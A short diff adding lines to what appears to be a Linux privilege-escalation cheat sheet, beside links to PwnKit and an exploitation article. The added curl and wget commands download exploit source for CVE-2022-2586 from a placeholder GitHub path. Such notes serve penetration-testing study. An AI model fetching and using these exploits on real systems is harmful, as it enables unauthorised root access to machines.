@@ -218,7 +218,8 @@ https://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-
 # Pwnkit
 https://github.com/ly4k/PwnKit
 
-
-
+# Download file and save as exploit.c in current directory
+curl -o exploit.c https://raw.githubusercontent.com/whatever/exploit/CVE-2022-2586.c
+wget -O exploit.c https://raw.githubusercontent.com/whatever/exploit/CVE-2022-2586.c
 
 
